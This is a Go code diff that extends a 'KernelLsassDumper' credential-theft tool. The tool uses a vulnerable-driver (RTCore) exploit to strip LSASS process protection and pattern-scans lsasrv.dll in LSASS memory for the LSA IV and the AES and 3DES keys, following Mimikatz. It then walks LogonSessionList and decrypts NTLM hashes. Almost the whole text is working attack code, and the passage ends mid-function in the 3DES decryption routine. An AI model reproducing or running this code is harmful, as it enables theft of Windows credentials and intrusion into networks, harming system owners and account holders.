@@ -2,6 +2,7 @@ package lsass
 
 import (
 	"crypto/aes"
+	"crypto/cipher"
 	"crypto/des"
 	"encoding/binary"
 	"fmt"
@@ -33,6 +34,11 @@ func NewKernelLsassDumper(rtcore *byovd.RTCoreExploit, logger *logger.Logger) *K
 // GetRTCore returns the RTCore exploit instance
 func (kld *KernelLsassDumper) GetRTCore() *byovd.RTCoreExploit {
 	return kld.rtcore
+}
+
+// GetLsassPID returns the LSASS process ID
+func (kld *KernelLsassDumper) GetLsassPID() uint32 {
+	return kld.lsassPID
 }
 
 // DumpCredentials - MAIN ENTRY POINT for kernel-mode credential extraction
@@ -70,12 +76,12 @@ func (kld *KernelLsassDumper) DumpCredentials() ([]Credential, error) {
 	}
 	kld.logger.Infof("✓ Found lsasrv.dll at physical address: 0x%X", lsasrvBase)
 
-	// Step 3: Extract decryption keys from lsasrv.dll (in our process)
-	aesKey, des3Key, err := kld.extractDecryptionKeys(lsasrvBase)
+	// Step 3: Extract IV and decryption keys from lsasrv.dll (in LSASS memory - Mimikatz method)
+	iv, des3Key, aesKey, err := kld.extractDecryptionKeys(lsasrvBase)
 	if err != nil {
 		kld.logger.Warnf("Failed to extract decryption keys: %v", err)
-	} else {
-		kld.logger.Infof("✓ Extracted AES/3DES keys from lsasrv.dll")
+	} else if des3Key != nil || aesKey != nil {
+		kld.logger.Infof("✓ Extracted IV + AES/3DES keys from lsasrv.dll")
 	}
 
 	// Step 4: Find LogonSessionList in lsasrv.dll
@@ -100,7 +106,7 @@ func (kld *KernelLsassDumper) DumpCredentials() ([]Credential, error) {
 	if err != nil {
 		// Fallback to direct syscall if OpenProcess still fails
 		kld.logger.Warnf("OpenProcess still failed after PPL removal: %v, trying direct syscall", err)
-		credentials, err := kld.readLsassViaDirectSyscall(logonSessionListAddr, aesKey, des3Key)
+		credentials, err := kld.readLsassViaDirectSyscall(logonSessionListAddr, iv, aesKey, des3Key)
 		if err != nil {
 			return nil, fmt.Errorf("all methods failed: %v", err)
 		}
@@ -110,8 +116,8 @@ func (kld *KernelLsassDumper) DumpCredentials() ([]Credential, error) {
 
 	kld.logger.Info("✓ Successfully opened LSASS process!")
 
-	// Step 7: Walk LogonSessionList using ReadProcessMemory
-	credentials, err := kld.walkLogonSessionListWithHandle(syscall.Handle(hProcess), logonSessionListAddr, aesKey, des3Key)
+	// Step 7: Walk LogonSessionList using ReadProcessMemory, passing IV + keys
+	credentials, err := kld.walkLogonSessionListWithHandle(syscall.Handle(hProcess), logonSessionListAddr, iv, aesKey, des3Key)
 	if err != nil {
 		return nil, fmt.Errorf("failed to walk LogonSessionList: %v", err)
 	}
@@ -196,7 +202,7 @@ func (kld *KernelLsassDumper) disableLsassPPL() error {
 
 	// First call to get buffer size
 	var returnLength uint32
-	ret, _, _ := ntQuerySystemInformation.Call(
+	_, _, _ = ntQuerySystemInformation.Call(
 		uintptr(SystemExtendedProcessInformation),
 		0,
 		0,
@@ -206,7 +212,7 @@ func (kld *KernelLsassDumper) disableLsassPPL() error {
 	// Allocate buffer
 	buffer := make([]byte, returnLength*2) // Extra space
 
-	ret, _, _ = ntQuerySystemInformation.Call(
+	ret, _, _ := ntQuerySystemInformation.Call(
 		uintptr(SystemExtendedProcessInformation),
 		uintptr(unsafe.Pointer(&buffer[0])),
 		uintptr(len(buffer)),
@@ -351,7 +357,7 @@ func (kld *KernelLsassDumper) findSystemEprocess() (uint64, error) {
 		}
 	}
 
-	return 0, fmt.Errorf("System EPROCESS not found (scanned %d chunks with %d offset sets)", scannedChunks, len(offsetSets))
+	return 0, fmt.Errorf("system EPROCESS not found (scanned %d chunks with %d offset sets)", scannedChunks, len(offsetSets))
 }
 
 // findLsassEprocess - Walk ActiveProcessLinks to find LSASS EPROCESS
@@ -474,83 +480,348 @@ func (kld *KernelLsassDumper) openProcessViaNtApi(pid uint32) (windows.Handle, e
 	return handle, nil
 }
 
-// findLsasrvInKernelMemory - Load lsasrv.dll in OUR process, scan it, assume LSASS has same ASLR
+// findLsasrvInKernelMemory - Find lsasrv.dll base address IN LSASS's MEMORY (not local!)
 func (kld *KernelLsassDumper) findLsasrvInKernelMemory() (uint64, error) {
-	kld.logger.Info("Loading lsasrv.dll in our own process to scan for patterns...")
+	kld.logger.Info("Finding lsasrv.dll in LSASS process memory...")
 
-	kernel32 := syscall.MustLoadDLL("kernel32.dll")
-	loadLibrary := kernel32.MustFindProc("LoadLibraryW")
-	getModuleInformation := syscall.MustLoadDLL("psapi.dll").MustFindProc("GetModuleInformation")
-	getCurrentProcess := kernel32.MustFindProc("GetCurrentProcess")
-
-	lsasrvPath, _ := syscall.UTF16PtrFromString("lsasrv.dll")
-
-	// Load lsasrv.dll in our process
-	handle, _, _ := loadLibrary.Call(uintptr(unsafe.Pointer(lsasrvPath)))
-	if handle == 0 {
-		return 0, fmt.Errorf("failed to load lsasrv.dll")
+	// Open LSASS process with minimal permissions to enumerate modules
+	hProcess, err := windows.OpenProcess(windows.PROCESS_QUERY_INFORMATION|windows.PROCESS_VM_READ, false, kld.lsassPID)
+	if err != nil {
+		return 0, fmt.Errorf("failed to open LSASS for module enumeration: %v", err)
 	}
+	defer windows.CloseHandle(hProcess)
 
-	kld.logger.Infof("✓ Loaded lsasrv.dll locally at 0x%X", handle)
+	// Enumerate modules in LSASS to find lsasrv.dll
+	psapi := syscall.MustLoadDLL("psapi.dll")
+	enumProcessModulesEx := psapi.MustFindProc("EnumProcessModulesEx")
+	getModuleBaseNameW := psapi.MustFindProc("GetModuleBaseNameW")
+	getModuleInformation := psapi.MustFindProc("GetModuleInformation")
 
-	// Get module info
-	type MODULEINFO struct {
-		BaseOfDll   uintptr
-		SizeOfImage uint32
-		EntryPoint  uintptr
-	}
+	const LIST_MODULES_ALL = 0x03
+	var modules [1024]syscall.Handle
+	var needed uint32
 
-	var modInfo MODULEINFO
-	currentProc, _, _ := getCurrentProcess.Call()
-
-	ret, _, _ := getModuleInformation.Call(
-		currentProc,
-		handle,
-		uintptr(unsafe.Pointer(&modInfo)),
-		unsafe.Sizeof(modInfo),
+	ret, _, _ := enumProcessModulesEx.Call(
+		uintptr(hProcess),
+		uintptr(unsafe.Pointer(&modules[0])),
+		uintptr(len(modules)*int(unsafe.Sizeof(modules[0]))),
+		uintptr(unsafe.Pointer(&needed)),
+		LIST_MODULES_ALL,
 	)
 
 	if ret == 0 {
-		kld.logger.Warnf("GetModuleInformation failed, assuming 2MB size")
-		modInfo.SizeOfImage = 0x200000
+		return 0, fmt.Errorf("EnumProcessModulesEx failed")
 	}
 
-	kld.logger.Infof("lsasrv.dll size: 0x%X bytes", modInfo.SizeOfImage)
+	moduleCount := needed / uint32(unsafe.Sizeof(modules[0]))
+	kld.logger.Infof("Found %d modules in LSASS", moduleCount)
 
-	// CRITICAL: lsasrv.dll is ASLR randomized per boot, but typically in same range
-	// Windows loads system DLLs at consistent addresses across processes
-	// So our local address ≈ LSASS's address (within ~1GB range)
+	// Find lsasrv.dll
+	for i := uint32(0); i < moduleCount; i++ {
+		var baseName [260]uint16
+		ret, _, _ := getModuleBaseNameW.Call(
+			uintptr(hProcess),
+			uintptr(modules[i]),
+			uintptr(unsafe.Pointer(&baseName[0])),
+			uintptr(len(baseName)),
+		)
 
-	// For Windows 11 26100, lsasrv.dll base is typically 0x00007FFEAxxxxxxx
-	// Let's just use the address we loaded it at - Windows ASLR is consistent!
+		if ret == 0 {
+			continue
+		}
 
-	lsasrvBase := uint64(handle)
-	kld.logger.Infof("Using lsasrv.dll base address: 0x%X", lsasrvBase)
+		name := syscall.UTF16ToString(baseName[:])
+		if name == "lsasrv.dll" {
+			// Get module information
+			type MODULEINFO struct {
+				BaseOfDll   uintptr
+				SizeOfImage uint32
+				EntryPoint  uintptr
+			}
 
-	return lsasrvBase, nil
+			var modInfo MODULEINFO
+			ret, _, _ := getModuleInformation.Call(
+				uintptr(hProcess),
+				uintptr(modules[i]),
+				uintptr(unsafe.Pointer(&modInfo)),
+				unsafe.Sizeof(modInfo),
+			)
+
+			if ret == 0 {
+				return 0, fmt.Errorf("GetModuleInformation failed for lsasrv.dll")
+			}
+
+			kld.logger.Infof("✓ Found lsasrv.dll in LSASS at 0x%X (size: 0x%X bytes)", modInfo.BaseOfDll, modInfo.SizeOfImage)
+			return uint64(modInfo.BaseOfDll), nil
+		}
+	}
+
+	return 0, fmt.Errorf("lsasrv.dll not found in LSASS process")
 }
 
-// extractDecryptionKeys - Extract AES and 3DES keys from lsasrv.dll
-func (kld *KernelLsassDumper) extractDecryptionKeys(lsasrvBase uint64) ([]byte, []byte, error) {
-	// Pattern scan lsasrv.dll for encryption keys
-	// This would implement the actual pattern scanning from mimikatz
-	// For now, return empty keys (credentials will be encrypted)
-	return nil, nil, nil
+// KIWI_BCRYPT_HANDLE_KEY structure from Mimikatz
+type KIWI_BCRYPT_HANDLE_KEY struct {
+	Size       uint32
+	Tag        uint32 // 'UUUR'
+	HAlgorithm uintptr
+	Key        uintptr
+	Unk0       uintptr
 }
 
-// findLogonSessionList - Find LogonSessionList global in lsasrv.dll
-func (kld *KernelLsassDumper) findLogonSessionList(lsasrvBase uint64) (uint64, error) {
-	// Read lsasrv.dll from OUR OWN PROCESS MEMORY (not via RTCore!)
-	kld.logger.Info("Reading lsasrv.dll from our own process memory...")
+// KIWI_BCRYPT_KEY81 structure from Mimikatz (Windows 8.1+)
+type KIWI_BCRYPT_KEY81 struct {
+	Size uint32
+	Tag  uint32 // 'MSSK'
+	Type uint32
+	Unk0 uint32
+	Unk1 uint32
+	Unk2 uint32
+	Unk3 uint32
+	Unk4 uint32
+	Unk5 uintptr
+	Unk6 uint32
+	Unk7 uint32
+	Unk8 uint32
+	Unk9 uint32
+	// KIWI_HARD_KEY follows
+}
 
-	// lsasrvBase is the address where we loaded it in OUR process
-	// We can read it directly using unsafe pointer!
-	lsasrvPtr := (*[1 << 30]byte)(unsafe.Pointer(uintptr(lsasrvBase)))
-	lsasrvData := lsasrvPtr[:0x1B1000] // Size we got from GetModuleInformation
+// KIWI_HARD_KEY structure from Mimikatz
+type KIWI_HARD_KEY struct {
+	CbSecret uint32
+	// Data follows
+}
 
-	kld.logger.Infof("Scanning %d bytes of lsasrv.dll for LogonSessionList pattern...", len(lsasrvData))
+// extractDecryptionKeys - Extract IV, AES and 3DES keys from lsasrv.dll IN LSASS MEMORY (Mimikatz method)
+func (kld *KernelLsassDumper) extractDecryptionKeys(lsasrvBaseInLsass uint64) ([16]byte, []byte, []byte, error) {
+	kld.logger.Info("Extracting LSA encryption keys from lsasrv.dll in LSASS memory...")
 
-	// Try MULTIPLE patterns for different Windows 11 builds
+	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, kld.lsassPID)
+	if err != nil {
+		return [16]byte{}, nil, nil, fmt.Errorf("failed to open LSASS for key extraction: %v", err)
+	}
+	defer windows.CloseHandle(hProcess)
+
+	lsasrvSize := uint32(0x200000)
+	lsasrvData := make([]byte, lsasrvSize)
+
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")
+
+	var bytesRead uintptr
+	ret, _, _ := readProcessMemory.Call(
+		uintptr(hProcess),
+		uintptr(lsasrvBaseInLsass),
+		uintptr(unsafe.Pointer(&lsasrvData[0])),
+		uintptr(lsasrvSize),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+
+	if ret == 0 {
+		return [16]byte{}, nil, nil, fmt.Errorf("failed to read lsasrv.dll for key extraction")
+	}
+
+	// Patterns for LsaInitializeProtectedMemory (from Mimikatz)
+	// Format: {off0, off1, off2} = offsets to InitializationVector, h3DesKey, hAesKey
+	patterns := []struct {
+		name    string
+		pattern []byte
+		off0    int // InitializationVector offset
+		off1    int // h3DesKey offset
+		off2    int // hAesKey offset
+	}{
+		{"Win11 22H2", []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15}, 71, -89, 16},
+		{"Win10 1809+", []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15}, 67, -89, 16},
+		{"Win10 1507", []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x48, 0x8d, 0x45, 0xe0, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8d, 0x15}, 61, -73, 16},
+		{"Win8.1", []byte{0x83, 0x64, 0x24, 0x30, 0x00, 0x44, 0x8b, 0x4d, 0xd8, 0x48, 0x8b, 0x0d}, 62, -70, 23},
+	}
+
+	var ivAddr, h3DesAddr, hAesAddr uint64
+
+	for _, p := range patterns {
+		for i := 0; i < int(bytesRead)-len(p.pattern); i++ {
+			match := true
+			for j := 0; j < len(p.pattern); j++ {
+				if lsasrvData[i+j] != p.pattern[j] {
+					match = false
+					break
+				}
+			}
+
+			if match {
+				kld.logger.Infof("Found LsaInitializeProtectedMemory pattern: %s", p.name)
+
+				// Calculate addresses using RIP-relative offsets
+				baseAddr := lsasrvBaseInLsass + uint64(i)
+
+				// InitializationVector
+				ivOffset := int32(binary.LittleEndian.Uint32(lsasrvData[i+p.off0+3 : i+p.off0+7]))
+				ivAddr = baseAddr + uint64(p.off0) + 7 + uint64(ivOffset)
+
+				// h3DesKey
+				h3DesOffset := int32(binary.LittleEndian.Uint32(lsasrvData[i+p.off1+3 : i+p.off1+7]))
+				h3DesAddr = baseAddr + uint64(p.off1) + 7 + uint64(h3DesOffset)
+
+				// hAesKey
+				hAesOffset := int32(binary.LittleEndian.Uint32(lsasrvData[i+p.off2+3 : i+p.off2+7]))
+				hAesAddr = baseAddr + uint64(p.off2) + 7 + uint64(hAesOffset)
+
+				kld.logger.Infof("IV: 0x%X, h3Des: 0x%X, hAes: 0x%X", ivAddr, h3DesAddr, hAesAddr)
+				break
+			}
+		}
+		if ivAddr != 0 {
+			break
+		}
+	}
+
+	if ivAddr == 0 {
+		kld.logger.Error("❌ CRITICAL: LsaInitializeProtectedMemory pattern not found!")
+		kld.logger.Error("   This means:")
+		kld.logger.Error("   1. Windows version pattern mismatch (add new pattern)")
+		kld.logger.Error("   2. lsasrv.dll structure changed (update patterns)")
+		kld.logger.Error("   Credentials will be ENCRYPTED and unreadable")
+		return [16]byte{}, nil, nil, fmt.Errorf("pattern not found in lsasrv.dll")
+	}
+
+	// Extract InitializationVector (16 bytes)
+	var iv [16]byte
+	ret, _, _ = readProcessMemory.Call(
+		uintptr(hProcess),
+		uintptr(ivAddr),
+		uintptr(unsafe.Pointer(&iv[0])),
+		16,
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 || bytesRead != 16 {
+		kld.logger.Warnf("Failed to read InitializationVector at 0x%X", ivAddr)
+	} else {
+		kld.logger.Infof("✓ Extracted InitializationVector: %x", iv[:8])
+	}
+
+	// Extract h3DesKey
+	h3DesKey, err := kld.extractBCryptKey(hProcess, readProcessMemory, h3DesAddr)
+	if err != nil {
+		kld.logger.Errorf("❌ Failed to extract 3DES key: %v", err)
+		kld.logger.Error("   Credentials using 3DES encryption will be unreadable")
+	} else {
+		kld.logger.Infof("✓ Extracted 3DES key (%d bytes)", len(h3DesKey))
+	}
+
+	// Extract hAesKey
+	aesKey, err := kld.extractBCryptKey(hProcess, readProcessMemory, hAesAddr)
+	if err != nil {
+		kld.logger.Errorf("❌ Failed to extract AES key: %v", err)
+		kld.logger.Error("   Credentials using AES encryption will be unreadable")
+	} else {
+		kld.logger.Infof("✓ Extracted AES key (%d bytes)", len(aesKey))
+	}
+
+	// Return IV and keys for decryption (Mimikatz order: IV, 3DES, AES)
+	return iv, h3DesKey, aesKey, nil
+}
+
+// extractBCryptKey - Extract key material from BCrypt key handle (Mimikatz method)
+func (kld *KernelLsassDumper) extractBCryptKey(hProcess windows.Handle, readProcessMemory *syscall.Proc, keyHandleAddr uint64) ([]byte, error) {
+	// Read pointer to KIWI_BCRYPT_HANDLE_KEY
+	var pHandleKey uint64
+	var bytesRead uintptr
+	ret, _, _ := readProcessMemory.Call(
+		uintptr(hProcess),
+		uintptr(keyHandleAddr),
+		uintptr(unsafe.Pointer(&pHandleKey)),
+		8,
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 || pHandleKey == 0 {
+		return nil, fmt.Errorf("failed to read key handle pointer")
+	}
+
+	// Read KIWI_BCRYPT_HANDLE_KEY structure
+	var handleKey KIWI_BCRYPT_HANDLE_KEY
+	ret, _, _ = readProcessMemory.Call(
+		uintptr(hProcess),
+		uintptr(pHandleKey),
+		uintptr(unsafe.Pointer(&handleKey)),
+		unsafe.Sizeof(handleKey),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 || handleKey.Tag != 0x55555552 { // 'UUUR'
+		return nil, fmt.Errorf("invalid BCRYPT_HANDLE_KEY (tag: 0x%X)", handleKey.Tag)
+	}
+
+	// Read KIWI_BCRYPT_KEY81 structure
+	keySize := uint32(0x200)
+	keyBuffer := make([]byte, keySize)
+	ret, _, _ = readProcessMemory.Call(
+		uintptr(hProcess),
+		uintptr(handleKey.Key),
+		uintptr(unsafe.Pointer(&keyBuffer[0])),
+		uintptr(keySize),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+	if ret == 0 {
+		return nil, fmt.Errorf("failed to read BCRYPT_KEY")
+	}
+
+	tag := binary.LittleEndian.Uint32(keyBuffer[4:8])
+	if tag != 0x4B53534D { // 'MSSK'
+		return nil, fmt.Errorf("invalid BCRYPT_KEY tag: 0x%X", tag)
+	}
+
+	// KIWI_HARD_KEY offset varies by Windows version
+	// Windows 8.1+: offset 0x58 (after KIWI_BCRYPT_KEY81 header)
+	hardKeyOffset := 0x58
+	cbSecret := binary.LittleEndian.Uint32(keyBuffer[hardKeyOffset : hardKeyOffset+4])
+
+	if cbSecret == 0 || cbSecret > 1024 {
+		return nil, fmt.Errorf("invalid key size: %d", cbSecret)
+	}
+
+	// Extract key data
+	keyData := make([]byte, cbSecret)
+	copy(keyData, keyBuffer[hardKeyOffset+4:hardKeyOffset+4+int(cbSecret)])
+
+	kld.logger.Infof("Extracted BCrypt key (%d bytes)", cbSecret)
+	return keyData, nil
+}
+
+// findLogonSessionList - Find LogonSessionList global in lsasrv.dll BY READING FROM LSASS MEMORY
+// This is EXACTLY how Mimikatz does it - we read from LSASS's copy, not a local one!
+func (kld *KernelLsassDumper) findLogonSessionList(lsasrvBaseInLsass uint64) (uint64, error) {
+	kld.logger.Info("Reading lsasrv.dll FROM LSASS MEMORY to find LogonSessionList...")
+
+	// Open LSASS with read permissions
+	hProcess, err := windows.OpenProcess(windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, false, kld.lsassPID)
+	if err != nil {
+		return 0, fmt.Errorf("failed to open LSASS for reading lsasrv.dll: %v", err)
+	}
+	defer windows.CloseHandle(hProcess)
+
+	// Read lsasrv.dll from LSASS memory (not local!)
+	// Typical size is ~1.7MB, read 2MB to be safe
+	lsasrvSize := uint32(0x200000) // 2MB
+	lsasrvData := make([]byte, lsasrvSize)
+
+	kernel32 := syscall.MustLoadDLL("kernel32.dll")
+	readProcessMemory := kernel32.MustFindProc("ReadProcessMemory")
+
+	var bytesRead uintptr
+	ret, _, _ := readProcessMemory.Call(
+		uintptr(hProcess),
+		uintptr(lsasrvBaseInLsass),
+		uintptr(unsafe.Pointer(&lsasrvData[0])),
+		uintptr(lsasrvSize),
+		uintptr(unsafe.Pointer(&bytesRead)),
+	)
+
+	if ret == 0 {
+		return 0, fmt.Errorf("failed to read lsasrv.dll from LSASS memory")
+	}
+
+	kld.logger.Infof("Scanning %d bytes of lsasrv.dll (FROM LSASS) for LogonSessionList pattern...", bytesRead)
+
+	// Try MULTIPLE patterns for different Windows builds
 	patterns := []struct {
 		name    string
 		pattern []byte
@@ -567,8 +838,8 @@ func (kld *KernelLsassDumper) findLogonSessionList(lsasrvBase uint64) (uint64, e
 	for _, p := range patterns {
 		kld.logger.Infof("Trying pattern: %s", p.name)
 
-		// Search for pattern
-		for i := 0; i < len(lsasrvData)-len(p.pattern); i++ {
+		// Search for pattern in LSASS's copy of lsasrv.dll
+		for i := 0; i < int(bytesRead)-len(p.pattern); i++ {
 			match := true
 			for j := 0; j < len(p.pattern); j++ {
 				if p.pattern[j] != '?' && lsasrvData[i+j] != p.pattern[j] {
@@ -578,29 +849,49 @@ func (kld *KernelLsassDumper) findLogonSessionList(lsasrvBase uint64) (uint64, e
 			}
 
 			if match {
-				// Extract RIP-relative offset
-				offset := int32(binary.LittleEndian.Uint32(lsasrvData[i+3 : i+7]))
-				// Calculate target address: instruction address + instruction length + offset
-				instructionAddr := lsasrvBase + uint64(i)
-				targetAddr := instructionAddr + 7 + uint64(offset)
+				// Extract RIP-relative offset from the instruction (4 bytes at offset +3)
+				ripOffset := int32(binary.LittleEndian.Uint32(lsasrvData[i+3 : i+7]))
 
-				kld.logger.Infof("✓ Found LogonSessionList pattern (%s) at offset 0x%X, target: 0x%X", p.name, i, targetAddr)
+				// Calculate target address: instructionAddr + instructionLength(7) + ripOffset
+				instructionAddr := lsasrvBaseInLsass + uint64(i)
+				targetAddr := instructionAddr + 7 + uint64(ripOffset)
 
-				// Read the pointer from our own process
-				localPtrAddr := (*uint64)(unsafe.Pointer(uintptr(targetAddr)))
-				listAddr := *localPtrAddr
+				kld.logger.Infof("✓ Found LogonSessionList pattern (%s) at offset 0x%X", p.name, i)
+				kld.logger.Infof("  Instruction at: 0x%X", instructionAddr)
+				kld.logger.Infof("  RIP offset: 0x%X (%d)", ripOffset, ripOffset)
+				kld.logger.Infof("  Target address: 0x%X", targetAddr)
 
-				kld.logger.Infof("✓ LogonSessionList pointer: 0x%X", listAddr)
+				// NOW READ THE POINTER VALUE FROM THAT TARGET ADDRESS IN LSASS MEMORY
+				var pointerValue uint64
+				var ptrBytesRead uintptr
+
+				ret, _, _ := readProcessMemory.Call(
+					uintptr(hProcess),
+					uintptr(targetAddr),
+					uintptr(unsafe.Pointer(&pointerValue)),
+					8, // Read 8 bytes (pointer size)
+					uintptr(unsafe.Pointer(&ptrBytesRead)),
+				)
+
+				if ret == 0 || ptrBytesRead != 8 {
+					kld.logger.Warnf("  Failed to read pointer at 0x%X, trying next match", targetAddr)
+					continue
+				}
+
+				kld.logger.Infof("  ✓ LogonSessionList pointer: 0x%X", pointerValue)
 
 				// Validate pointer (should be in kernel address space)
-				if listAddr != 0 && listAddr > 0x7FF000000000 {
-					return listAddr, nil
+				if pointerValue != 0 && pointerValue > 0x7FF000000000 {
+					kld.logger.Infof("  ✓ Valid kernel address!")
+					return pointerValue, nil
+				} else {
+					kld.logger.Warnf("  Invalid address (0x%X), trying next pattern", pointerValue)
 				}
 			}
 		}
 	}
 
-	return 0, fmt.Errorf("LogonSessionList pattern not found in any known pattern")
+	return 0, fmt.Errorf("LogonSessionList pattern not found in lsasrv.dll")
 }
 
 // findLsassCr3 - Find LSASS's DirectoryTableBase (CR3) by scanning physical memory for EPROCESS
@@ -621,7 +912,7 @@ func (kld *KernelLsassDumper) findLsassCr3() (uint64, error) {
 }
 
 // readLsassViaDirectSyscall - Try reading LSASS memory using NtReadVirtualMemory with pseudo-handle
-func (kld *KernelLsassDumper) readLsassViaDirectSyscall(logonSessionListAddr uint64, aesKey []byte, des3Key []byte) ([]Credential, error) {
+func (kld *KernelLsassDumper) readLsassViaDirectSyscall(logonSessionListAddr uint64, iv [16]byte, aesKey []byte, des3Key []byte) ([]Credential, error) {
 	ntdll := syscall.MustLoadDLL("ntdll.dll")
 	ntReadVirtualMemory := ntdll.MustFindProc("NtReadVirtualMemory")
 
@@ -682,7 +973,7 @@ func (kld *KernelLsassDumper) readLsassViaDirectSyscall(logonSessionListAddr uin
 		}
 
 		// Extract credentials
-		cred := kld.extractCredentialFromEntry(entryData, aesKey, des3Key)
+		cred := kld.extractCredentialFromEntry(entryData, iv, aesKey, des3Key)
 		if cred != nil {
 			credentials = append(credentials, *cred)
 		}
@@ -697,7 +988,7 @@ func (kld *KernelLsassDumper) readLsassViaDirectSyscall(logonSessionListAddr uin
 
 // walkLogonSessionListViaKernel - Walk LogonSessionList using direct kernel memory via RTCore
 // This bypasses OpenProcess entirely by reading physical memory directly
-func (kld *KernelLsassDumper) walkLogonSessionListViaKernel(listHead uint64, cr3 uint64, aesKey []byte, des3Key []byte) ([]Credential, error) {
+func (kld *KernelLsassDumper) walkLogonSessionListViaKernel(listHead uint64, cr3 uint64, iv [16]byte, aesKey []byte, des3Key []byte) ([]Credential, error) {
 	var credentials []Credential
 
 	kld.logger.Info("Walking LogonSessionList via direct kernel memory access...")
@@ -753,7 +1044,7 @@ func (kld *KernelLsassDumper) walkLogonSessionListViaKernel(listHead uint64, cr3
 		}
 
 		// Extract credentials from this entry
-		cred := kld.extractCredentialFromEntry(entryData, aesKey, des3Key)
+		cred := kld.extractCredentialFromEntry(entryData, iv, aesKey, des3Key)
 		if cred != nil {
 			credentials = append(credentials, *cred)
 			kld.logger.Infof("Found credential: %s\\%s", cred.Domain, cred.Username)
@@ -768,7 +1059,7 @@ func (kld *KernelLsassDumper) walkLogonSessionListViaKernel(listHead uint64, cr3
 }
 
 // walkLogonSessionListWithHandle - Walk the LogonSessionList linked list using ReadProcessMemory
-func (kld *KernelLsassDumper) walkLogonSessionListWithHandle(hProcess syscall.Handle, listHead uint64, aesKey []byte, des3Key []byte) ([]Credential, error) {
+func (kld *KernelLsassDumper) walkLogonSessionListWithHandle(hProcess syscall.Handle, listHead uint64, iv [16]byte, aesKey []byte, des3Key []byte) ([]Credential, error) {
 	var credentials []Credential
 
 	kld.logger.Info("Walking LogonSessionList with ReadProcessMemory (MIMIKATZ METHOD)...")
@@ -845,7 +1136,7 @@ func (kld *KernelLsassDumper) walkLogonSessionListWithHandle(hProcess syscall.Ha
 }
 
 // walkLogonSessionList - OLD VERSION using RTCore (kept for reference)
-func (kld *KernelLsassDumper) walkLogonSessionList(listHead uint64, aesKey []byte, des3Key []byte) ([]Credential, error) {
+func (kld *KernelLsassDumper) walkLogonSessionList(listHead uint64, iv [16]byte, aesKey []byte, des3Key []byte) ([]Credential, error) {
 	var credentials []Credential
 
 	kld.logger.Info("Walking LogonSessionList...")
@@ -876,7 +1167,7 @@ func (kld *KernelLsassDumper) walkLogonSessionList(listHead uint64, aesKey []byt
 		}
 
 		// Extract credentials from this entry
-		cred := kld.extractCredentialFromEntry(entryData, aesKey, des3Key)
+		cred := kld.extractCredentialFromEntry(entryData, iv, aesKey, des3Key)
 		if cred != nil {
 			credentials = append(credentials, *cred)
 		}
@@ -890,7 +1181,7 @@ func (kld *KernelLsassDumper) walkLogonSessionList(listHead uint64, aesKey []byt
 }
 
 // extractCredentialFromEntry - Extract credential from a logon session entry
-func (kld *KernelLsassDumper) extractCredentialFromEntry(entryData []byte, aesKey []byte, des3Key []byte) *Credential {
+func (kld *KernelLsassDumper) extractCredentialFromEntry(entryData []byte, iv [16]byte, aesKey []byte, des3Key []byte) *Credential {
 	// REAL IMPLEMENTATION: Parse KIWI_MSV1_0_LIST_63 structure
 	// Structure layout (from mimikatz):
 	// +0x00: LIST_ENTRY Flink/Blink
@@ -973,7 +1264,7 @@ func (kld *KernelLsassDumper) extractCredentialFromEntry(entryData []byte, aesKe
 
 		// Try decrypting with AES
 		if len(aesKey) == 16 {
-			decrypted := kld.tryDecryptAES(hashBytes, aesKey)
+			decrypted := kld.tryDecryptAES(hashBytes, aesKey, iv)
 			if isValidNTLMHash(decrypted) {
 				ntlmHash = fmt.Sprintf("%X", decrypted)
 				kld.logger.Debugf("Found NTLM hash (AES decrypted)")
@@ -983,7 +1274,7 @@ func (kld *KernelLsassDumper) extractCredentialFromEntry(entryData []byte, aesKe
 
 		// Try decrypting with 3DES
 		if len(des3Key) == 24 {
-			decrypted := kld.tryDecrypt3DES(hashBytes, des3Key)
+			decrypted := kld.tryDecrypt3DES(hashBytes, des3Key, iv)
 			if isValidNTLMHash(decrypted) {
 				ntlmHash = fmt.Sprintf("%X", decrypted)
 				kld.logger.Debugf("Found NTLM hash (3DES decrypted)")
@@ -1097,8 +1388,8 @@ func isValidNTLMHash(hash []byte) bool {
 	return !allZeros && !allFFs
 }
 
-func (kld *KernelLsassDumper) tryDecryptAES(data []byte, key []byte) []byte {
-	if len(data) != 16 || len(key) != 16 {
+func (kld *KernelLsassDumper) tryDecryptAES(data []byte, key []byte, iv [16]byte) []byte {
+	if len(data) < 16 || len(key) == 0 {
 		return data
 	}
 
@@ -1107,24 +1398,33 @@ func (kld *KernelLsassDumper) tryDecryptAES(data []byte, key []byte) []byte {
 		return data
 	}
 
-	decrypted := make([]byte, 16)
-	block.Decrypt(decrypted, data)
+	// Mimikatz uses CFB mode: BCryptSetProperty(..., BCRYPT_CHAIN_MODE_CFB, ...)
+	stream := cipher.NewCFBDecrypter(block, iv[:])
+	decrypted := make([]byte, len(data))
+	stream.XORKeyStream(decrypted, data)
 	return decrypted
 }
 
-func (kld *KernelLsassDumper) tryDecrypt3DES(data []byte, key []byte) []byte {
-	if len(data) != 16 || len(key) != 24 {
+func (kld *KernelLsassDumper) tryDecrypt3DES(data []byte, key []byte, iv [16]byte) []byte {
+	if len(data) < 8 || len(key) != 24 {
 		return data
 	}
 
-	// 3DES operates on 8-byte blocks
+	// Mimikatz uses CBC mode: BCryptSetProperty(..., BCRYPT_CHAIN_MODE_CBC, ...)
 	block, err := des.NewTripleDESCipher(key)
 	if err != nil {
 		return data
 	}
 
-	decrypted := make([]byte, 16)
-	block.Decrypt(decrypted[0:8], data[0:8])
